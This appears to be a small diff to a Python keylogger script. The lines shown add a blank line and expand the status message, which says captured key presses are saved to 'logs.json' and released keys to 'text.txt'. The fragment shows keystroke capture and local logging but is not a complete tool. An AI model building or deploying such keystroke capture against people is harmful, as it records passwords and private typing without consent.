@@ -38,10 +38,11 @@ def on_release(key):
     if x == True:
         x = False
     update_json_file(key_list)
+
     key_strokes = key_strokes + str(key)
     update_txt_file(str(key_strokes))
 
-print("[+] Running Keylogger Successfuly!\n[!] Saving the key logs in 'logs.json'")
+print("[+] Running Keylogger Successfuly!\n[!] Saving the Pressed, Held and Released key logs in 'logs.json\n[!] Saving only the Released key logs in 'text.txt'")
 
 with keyboard.Listener(
         on_press = on_press,
